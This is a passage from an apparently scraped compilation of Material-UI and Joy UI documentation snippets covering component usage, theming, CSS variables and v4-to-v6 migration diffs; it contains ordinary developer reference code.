 {/* Modal content */}\n    </Modal>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Half-Star Rating in React with Material-UI\nDESCRIPTION: Shows how to implement a rating component with half-star precision. The precision prop is used to define the minimum increment value change allowed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"HalfRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Slider Marks Placement in React\nDESCRIPTION: Shows how to customize the placement of marks for minimum and maximum values on a slider in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_14\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomMarks.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating ThemeProvider Import Path\nDESCRIPTION: Diff showing the updated import path for ThemeProvider, moving from @mui/styles to @mui/material/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n-import { ThemeProvider } from '@mui/styles';\n+import { ThemeProvider } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Quilted Image List Implementation in Material-UI\nDESCRIPTION: Shows how to create a quilted image list layout with varied container sizes and ratios to establish visual hierarchy.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"QuiltedImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Standard Image List Implementation in Material-UI\nDESCRIPTION: Demonstrates implementation of a standard image list with uniform container sizes and spacing for items of equal importance.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"StandardImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Creating Styled Offset for Fixed App Bar\nDESCRIPTION: Demonstrates how to create a styled offset component using theme mixins to handle fixed App Bar spacing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/app-bar/app-bar.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst Offset = styled('div')(({ theme }) => theme.mixins.toolbar);\n\nfunction App() {\n  return (\n    <React.Fragment>\n      <AppBar position=\"fixed\">\n        <Toolbar>{/* content */}</Toolbar>\n      </AppBar>\n      <Offset />\n    </React.Fragment>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating TextField default variant in React\nDESCRIPTION: Changes the default variant of TextField from 'standard' to 'outlined' and shows how to keep using the 'standard' variant.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_37\n\nLANGUAGE: diff\nCODE:\n```\n-<TextField value=\"Standard\" />\n-<TextField value=\"Outlined\" variant=\"outlined\" />\n+<TextField value=\"Standard\" variant=\"standard\" />\n+<TextField value=\"Outlined\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring Badge Overlap in React Material-UI\nDESCRIPTION: Demonstrates how to control badge positioning relative to the wrapped element using the overlap prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\nBadgeOverlap.js\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons with npm\nDESCRIPTION: Command to install @mui/icons-material and its dependencies using npm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/material-icons/material-icons.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material @mui/material @emotion/styled @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Importing Link Component in Joy UI\nDESCRIPTION: Shows how to import the Link component from Joy UI. This is the basic setup required to use the Link component in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/link/link.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Link from '@mui/joy/Link';\n```\n\n----------------------------------------\n\nTITLE: Icon Menu with Desktop Padding\nDESCRIPTION: Implementation of a menu with icons and increased padding for desktop viewport.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"IconMenu.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Using Avatars with Badges in React\nDESCRIPTION: Shows how to combine the Avatar component with badges for additional visual information or status indicators.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_11\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"BadgeAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using Skeleton with Typography in React JSX\nDESCRIPTION: This example shows how to use the Skeleton component with Typography, demonstrating its ability to infer dimensions from typography elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/skeleton/skeleton.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Typography variant=\"h1\">{loading ? <Skeleton /> : 'h1'}</Typography>\n```\n\n----------------------------------------\n\nTITLE: Forcing Label Shrink State in Material-UI TextField\nDESCRIPTION: Demonstrates how to force the 'shrink' state of the label in a Material-UI TextField component. This can be useful when the input's shrink state cannot be automatically determined.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<TextField slotProps={{ inputLabel: { shrink: true } }} />\n```\n\n----------------------------------------\n\nTITLE: Updating SvgIcon Color Prop\nDESCRIPTION: Prop rename from nativeColor to htmlColor for consistency with React naming conventions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n-<AddIcon nativeColor=\"#fff\" />\n+<AddIcon htmlColor=\"#fff\" />\n```\n\n----------------------------------------\n\nTITLE: Converting JSS to SX Props\nDESCRIPTION: Example demonstrating migration from JSS makeStyles to the sx prop API, showing simplified styling approach\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n import Chip from '@mui/material/Chip';\n-import makeStyles from '@mui/styles/makeStyles';\n+import Box from '@mui/material/Box';\n\n-const useStyles = makeStyles((theme) => ({\n-  wrapper: {\n-    display: 'flex',\n-  },\n-  chip: {\n-    padding: theme.spacing(1, 1.5),\n-    boxShadow: theme.shadows[1],\n-  }\n-}));\n\n function App() {\n-  const classes = useStyles();\n   return (\n-    <div className={classes.wrapper}>\n-      <Chip className={classes.chip} label=\"Chip\" />\n-    </div>\n+    <Box sx={{ display: 'flex' }}>\n+      <Chip label=\"Chip\" sx={{ py: 1, px: 1.5, boxShadow: 1 }} />\n+    </Box>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Implementing useTheme hook with CSS variables\nDESCRIPTION: Example of accessing theme variables using the useTheme hook in a component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useTheme } from '@mui/joy/styles';\n\nconst SomeComponent = () => {\n  const theme = useTheme(); // The runtime theme.\n\n  return (\n    <div>\n      <p style={{ color: {theme.vars.palette.primary[500]} }}>Some text here.</p>\n    </div>\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Creating Theme with Material Color References\nDESCRIPTION: Shows how to create a theme using Material-UI's built-in color references, importing specific colors and using their shade values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/color/color.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\nimport { purple } from '@mui/material/colors';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: purple[500],\n    },\n    secondary: {\n      main: '#f44336',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Theme Scoping with Material UI\nDESCRIPTION: Shows how to configure Material UI's ThemeProvider with THEME_ID to work alongside another UI library. This approach prevents theme conflicts by scoping the Material UI theme separately from other libraries.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/theme-scoping/theme-scoping.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ThemeProvider, THEME_ID, createTheme } from '@mui/material/styles';\nimport { AnotherThemeProvider } from 'another-ui-library';\n\nconst materialTheme = createTheme(/* your theme */);\n\nfunction App() {\n  return (\n    <AnotherThemeProvider>\n      <ThemeProvider theme={{ [THEME_ID]: materialTheme }}>\n        {/* components from another library and Material UI */}\n      </ThemeProvider>\n    </AnotherThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Switch default color prop in React\nDESCRIPTION: Changes the default color of the Switch component to 'primary' and shows how to explicitly set it to 'secondary' if needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_27\n\nLANGUAGE: diff\nCODE:\n```\n-<Switch />\n+<Switch color=\"secondary\" />\n```\n\n----------------------------------------\n\nTITLE: Installing Roboto Font via Fontsource\nDESCRIPTION: Commands to install Roboto font using Fontsource package with different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @fontsource/roboto\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @fontsource/roboto\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @fontsource/roboto\n```\n\n----------------------------------------\n\nTITLE: Customizing CSS variable prefixes\nDESCRIPTION: Examples of customizing and removing the default 'joy' prefix from CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nfunction App() {\n  return (\n    <CssVarsProvider theme={extendTheme({ cssVarPrefix: 'company' })}>\n      ...\n    </CssVarsProvider>\n  );\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nfunction App() {\n  return (\n    <CssVarsProvider theme={extendTheme({ cssVarPrefix: '' })}>...</CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Speed Dial in React\nDESCRIPTION: Demonstrates how to create a basic Speed Dial component that displays related actions when pressed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/speed-dial/speed-dial.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"BasicSpeedDial.js\"}\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Marks to Slider in React\nDESCRIPTION: Illustrates how to add custom marks to a slider by providing a rich array to the 'marks' prop in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DiscreteSliderMarks.js\"}\n```\n\n----------------------------------------\n\nTITLE: Spacing Prop Alternative Syntax in Material-UI\nDESCRIPTION: Demonstrates alternative syntax for spacing props using full property names instead of shorthand.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n-<Box sx={{ pt: 2 }} />\n+<Box sx={{ paddingTop: 2 }} />\n\n-<Box sx={{ px: 2 }} />\n+<Box sx={{ paddingX: 2 }} />\n```\n\n----------------------------------------\n\nTITLE: Configuring Danger Colors in MUI Joy UI Theme\nDESCRIPTION: Defines danger color palette and its variants for both light and dark themes. Includes styling for various component states like plain, outlined, soft, and solid variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst danger = {\n  50: '#FFF8F6',\n  100: '#FFE9E8',\n  200: '#FFC7C5',\n  300: '#FF9192',\n  400: '#FA5255',\n  500: '#D3232F',\n  600: '#A10E25',\n  700: '#77061B',\n  800: '#580013',\n  900: '#39000D',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        danger: {\n          ...danger,\n          plainColor: `var(--joy-palette-danger-600)`,\n          plainHoverBg: `var(--joy-palette-danger-100)`,\n          plainActiveBg: `var(--joy-palette-danger-200)`,\n          plainDisabledColor: `var(--joy-palette-danger-200)`,\n\n          outlinedColor: `var(--joy-palette-danger-500)`,\n          outlinedBorder: `var(--joy-palette-danger-200)`,\n          outlinedHoverBg: `var(--joy-palette-danger-100)`,\n          outlinedHoverBorder: `var(--joy-palette-danger-300)`,\n          outlinedActiveBg: `var(--joy-palette-danger-200)`,\n          outlinedDisabledColor: `var(--joy-palette-danger-100)`,\n          outlinedDisabledBorder: `var(--joy-palette-danger-100)`,\n\n          softColor: `var(--joy-palette-danger-600)`,\n          softBg: `var(--joy-palette-danger-100)`,\n          softHoverBg: `var(--joy-palette-danger-200)`,\n          softActiveBg: `var(--joy-palette-danger-300)`,\n          softDisabledColor: `var(--joy-palette-danger-300)`,\n          softDisabledBg: `var(--joy-palette-danger}-)50`,\n\n          solidColor: '#fff',\n          solidBg: `var(--joy-palette-danger-500)`,\n          solidHoverBg: `var(--joy-palette-danger-600)`,\n          solidActiveBg: `var(--joy-palette-danger-700)`,\n          solidDisabledColor: `#fff`,\n          solidDisabledBg: `var(--joy-palette-danger-200)`,\n        },\n      },\n    },\n    dark: {\n      palette: {\n        danger: {\n          ...danger,\n          plainColor: `var(--joy-palette-danger-300)`,\n          plainHoverBg: `var(--joy-palette-danger-800)`,\n          plainActiveBg: `var(--joy-palette-danger-700)`,\n          plainDisabledColor: `var(--joy-palette-danger-800)`,\n\n          outlinedColor: `var(--joy-palette-danger-200)`,\n          outlinedBorder: `var(--joy-palette-danger-700)`,\n          outlinedHoverBg: `var(--joy-palette-danger-800)`,\n          outlinedHoverBorder: `var(--joy-palette-danger-600)`,\n          outlinedActiveBg: `var(--joy-palette-danger-900)`,\n\n\n\n```\n\n----------------------------------------\n\nTITLE: Importing ListItemContent Component in React\nDESCRIPTION: Demonstrates how to import the ListItemContent component, which is used for managing content within list items, particularly useful for implementing ellipsis truncation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport ListItemContent from '@mui/joy/ListItemContent';\n```\n\n----------------------------------------\n\nTITLE: Creating Info Callout Block - Markup\nDESCRIPTION: Defines an info callout using markdown-like markup syntax, suitable for adding emphasized informational blocks to documentation. The content includes formatted text, inline code, bolding, and links. This pattern requires a renderer or documentation framework that recognizes ':::info' syntax and renders it as a styled info callout. No explicit parameters; content is static, but format supports markdown semantics within the block.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/callouts.md#2025-04-22_snippet_0\n\nLANGUAGE: markup\nCODE:\n```\n:::info\\nThis is an info callout.\\nIt says, \\\"Here's a bit of extra insight to help you understand this feature.\\\"\\n\\n- emphasised: **bold text**\\n- some code `<div/>`\\n- a [link](#link).\\n:::\n```\n\n----------------------------------------\n\nTITLE: InputElement Interface for Custom Input Components\nDESCRIPTION: Defines the TypeScript interface that custom input components should implement when integrating with Material-UI TextField.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_8\n\nLANGUAGE: ts\nCODE:\n```\ninterface InputElement {\n  focus(): void;\n  value?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Moving Component Props to components.defaultProps\nDESCRIPTION: Diff showing the relocation of component props from props to components.defaultProps in the theme structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n import { createTheme } from '@mui/material/styles';\n\n const theme = createTheme({\n-  props: {\n-    MuiButton: {\n-      disableRipple: true,\n-    },\n-  },\n+  components: {\n+    MuiButton: {\n+      defaultProps: {\n+        disableRipple: true,\n+      },\n+    },\n+  },\n });\n```\n\n----------------------------------------\n\nTITLE: Removing span wrapper from Tab in HTML\nDESCRIPTION: Removes the span element that wraps children and the wrapper classKey from Tab component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_36\n\nLANGUAGE: diff\nCODE:\n```\n  <button class=\"MuiTab-root\">\n-  <span class=\"MuiTab-wrapper\">\n      {icon}\n      {label}\n-  </span>\n  </button>\n```\n\n----------------------------------------\n\nTITLE: Rendering RichTreeView with Data - React JSX\nDESCRIPTION: This React JSX code renders the RichTreeView component from MUI X using a previously defined dataset as its 'items' prop. The 'multiSelect' prop enables support for selecting multiple tree nodes. Requires '@mui/x-tree-view' with RichTreeView installed as a dependency. The component expects 'items' to be a tree-structured array of objects, typically matching the pattern shown in the myDataSet example. Input: JavaScript data array; Output: Rendered tree view with optional multi-selection.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7-beta.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<RichTreeView items={myDataSet} multiSelect />\n```\n\n----------------------------------------\n\nTITLE: Setting RTL Direction for Modal Components\nDESCRIPTION: Example showing how to correctly apply RTL direction to components that use React portals, like Modal, which don't inherit the dir attribute from parent elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box dir=\"rtl\">\n  <Modal /> // ❌ this Modal will still be left-to-right (the default)\n</Box>\n<Box dir=\"rtl\">\n  <Modal dir=\"rtl\" /> // ✅ this Modal will be right-to-left as intended\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Input Component for Third-Party Libraries\nDESCRIPTION: Demonstrates how to create a custom input component that can be used with third-party input formatting libraries. This example shows the structure and interface implementation required for integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nconst MyInputComponent = React.forwardRef((props, ref) => {\n  const { component: Component, ...other } = props;\n\n  // implement `InputElement` interface\n  React.useImperativeHandle(ref, () => ({\n    focus: () => {\n      // logic to focus the rendered component from 3rd party belongs here\n    },\n    // hiding the value e.g. react-stripe-elements\n  }));\n\n  // `Component` will be your `SomeThirdPartyComponent` from below\n  return <Component {...other} />;\n});\n\n// usage\n<TextField\n  slotProps={{\n    input: {\n      inputComponent: MyInputComponent,\n      inputProps: {\n        component: SomeThirdPartyComponent,\n      },\n    },\n  }}\n/>;\n```\n\n----------------------------------------\n\nTITLE: Using theme.breakpoints.between Example\nDESCRIPTION: Example of using theme.breakpoints.between to apply styles for screens between sm and md breakpoints.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_8\n\nLANGUAGE: js\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    backgroundColor: 'blue',\n    // Match [sm, md)\n    //       [600px, 900px)\n    [theme.breakpoints.between('sm', 'md')]: {\n      backgroundColor: 'red',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Creating Reverse Alternating Timeline in React\nDESCRIPTION: Demonstrates a timeline that displays events on alternating sides in reverse order.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"AlternateReverseTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Cursor for Disabled Buttons using CSS\nDESCRIPTION: Shows how to override the default cursor behavior for disabled buttons using CSS. This snippet removes the pointer-events style and sets the cursor to not-allowed for disabled buttons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/buttons/buttons.md#2025-04-22_snippet_1\n\nLANGUAGE: CSS\nCODE:\n```\n.MuiButtonBase-root:disabled {\n  cursor: not-allowed;\n  pointer-events: auto;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Label-less Bottom Navigation for 4-5 Actions in React\nDESCRIPTION: This example shows how to implement a Bottom Navigation component with four or five actions, displaying inactive views as icons only without labels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/bottom-navigation/bottom-navigation.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n\"LabelBottomNavigation.js\"\n```\n\n----------------------------------------\n\nTITLE: Performance Optimization with GlobalStyles\nDESCRIPTION: Example showing how to optimize Text Field performance by disabling global style injection and manually adding required styles\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nimport { GlobalStyles, createTheme, ThemeProvider } from '@mui/material';\n\nconst theme = createTheme({\n  components: {\n    MuiInputBase: {\n      defaultProps: {\n        disableInjectingGlobalStyles: true,\n      },\n    },\n  },\n});\n\nexport default function App() {\n  return (\n    <ThemeProvider theme={theme}>\n      <GlobalStyles\n        styles={{\n          '@keyframes mui-auto-fill': { from: { display: 'block' } },\n          '@keyframes mui-auto-fill-cancel': { from: { display: 'block' } },\n        }}\n      />\n      ...\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Global CSS Reset with CssBaseline in Joy UI\nDESCRIPTION: This snippet demonstrates how to use the CssBaseline component to apply a global style reset. The component must be used under CssVarsProvider to work properly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/css-baseline/css-baseline.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport CssBaseline from '@mui/joy/CssBaseline';\n\nexport default function MyApp() {\n  return (\n    <CssVarsProvider>\n      {/* must be used under CssVarsProvider */}\n      <CssBaseline />\n\n      {/* The rest of your application */}\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Flex Direction with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to control the direction of flex items using the flexDirection property. Options include row (default), row-reverse, column, and column-reverse.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ flexDirection: 'row' }}>…\n<Box sx={{ flexDirection: 'row-reverse' }}>…\n<Box sx={{ flexDirection: 'column' }}>…\n<Box sx={{ flexDirection: 'column-reverse' }}>…\n```\n\n----------------------------------------\n\nTITLE: Restricting Slider Values in React\nDESCRIPTION: Demonstrates how to restrict selectable values to those provided with the 'marks' prop by setting 'step' to null in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DiscreteSliderValues.js\"}\n```\n\n----------------------------------------\n\nTITLE: Creating custom CSS variables with theme values\nDESCRIPTION: Example of creating new CSS variables using raw theme values instead of theme.vars.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_5\n\nLANGUAGE: js\nCODE:\n```\nconst Div = styled('div')(({ theme }) => ({\n  // Note that it's using `theme.shadow`, not `theme.vars.shadow`\n  boxShadow: theme.shadow.sm.replace(/,/g, ', inset'),\n}));\n```\n\n----------------------------------------\n\nTITLE: Accordion Component Structure\nDESCRIPTION: HTML structure showing the anatomy of a rendered Accordion component with its CSS classes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/accordion/accordion.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<div class=\"MuiAccordion-root\">\n  <h3 class=\"MuiAccordion-heading\">\n    <button class=\"MuiButtonBase-root MuiAccordionSummary-root\" aria-expanded=\"\">\n      <!-- Accordion summary goes here -->\n    </button>\n  </h3>\n  <div class=\"MuiAccordion-region\" role=\"region\">\n    <div class=\"MuiAccordionDetails-root\">\n      <!-- Accordion content goes here -->\n    </div>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Material UI Theme RTL Configuration\nDESCRIPTION: Configuration of RTL direction in Material UI theme using createTheme API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  direction: 'rtl',\n});\n```\n\n----------------------------------------\n\nTITLE: Importing useSwitch Hook from MUI Base\nDESCRIPTION: Shows how to import the useSwitch hook from @mui/base. This hook provides switch functionality without styling for maximum customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useSwitch } from '@mui/base/SwitchUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Importing Modal Component in React\nDESCRIPTION: Basic example showing how to import and use the Modal component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/modal/modal.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Modal from '@mui/joy/Modal';\n\nexport default function MyApp() {\n  return <Modal>{children}</Modal>;\n}\n```\n\n----------------------------------------\n\nTITLE: Deletable Chip Component\nDESCRIPTION: Implementation of chips with delete functionality using onDelete prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/chips/chips.md#2025-04-22_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport Chip from '@mui/material/Chip';\nimport Stack from '@mui/material/Stack';\n\nexport default function DeletableChips() {\n  const handleDelete = () => {\n    console.info('You clicked the delete icon.');\n  };\n\n  return (\n    <Stack direction=\"row\" spacing={1}>\n      <Chip label=\"Deletable\" onDelete={handleDelete} />\n      <Chip label=\"Deletable\" variant=\"outlined\" onDelete={handleDelete} />\n    </Stack>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Badge Colors in React Material-UI\nDESCRIPTION: Shows how to apply different theme palette colors to the Badge component using the color prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\nColorBadge.js\n```\n\n----------------------------------------\n\nTITLE: Integrating Material UI with Chakra UI\nDESCRIPTION: Shows how to use Material UI alongside Chakra UI by nesting Material UI's ThemeProvider inside Chakra UI's provider and assigning the Material UI theme to the THEME_ID property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/theme-scoping/theme-scoping.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ChakraProvider, extendTheme as chakraExtendTheme } from '@chakra-ui/react';\nimport {\n  ThemeProvider as MaterialThemeProvider,\n  createTheme as muiCreateTheme,\n  THEME_ID,\n} from '@mui/material/styles';\n\nconst chakraTheme = chakraExtendTheme();\nconst materialTheme = muiCreateTheme();\n\nfunction App() {\n  return (\n    <ChakraProvider theme={chakraTheme} resetCSS>\n      <MaterialThemeProvider theme={{ [THEME_ID]: materialTheme }}>\n        Chakra UI components and Material UI components\n      </MaterialThemeProvider>\n    </ChakraProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Simplifying Grid Size and Offset for Single Breakpoint in React\nDESCRIPTION: When size or offset values are consistent across all breakpoints, this snippet demonstrates how to simplify Grid props in v6 using a single value instead of an object.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs={6} xsOffset={2}>\n+<Grid size={6} offset={2}>\n```\n\n----------------------------------------\n\nTITLE: Overriding DataGrid Internal Components using the `components` Prop in React (JSX)\nDESCRIPTION: This JSX snippet shows how to replace a default internal component of the MUI DataGrid, specifically the `FilterPanelDeleteIcon`, with a custom `DeleteIcon` component. This is achieved by passing an object to the `components` prop where the key is the slot name (`FilterPanelDeleteIcon`) and the value is the custom component (`DeleteIcon`). This pattern allows for granular UI customization without modifying the core DataGrid structure. Requires React, MUI DataGrid, and a defined `DeleteIcon` component. The `{...data}` spread assumes existing row and column data props are passed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<DataGrid {...data} components={{ FilterPanelDeleteIcon: DeleteIcon }} />\n```\n\n----------------------------------------\n\nTITLE: Mixed String Values Spacing\nDESCRIPTION: Shows how to combine numeric spacing values with string values like 'auto'\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nmargin: theme.spacing(1, 'auto'), // '8px auto'\n```\n\n----------------------------------------\n\nTITLE: Alert Import Path Update\nDESCRIPTION: Shows the migration of Alert component import from 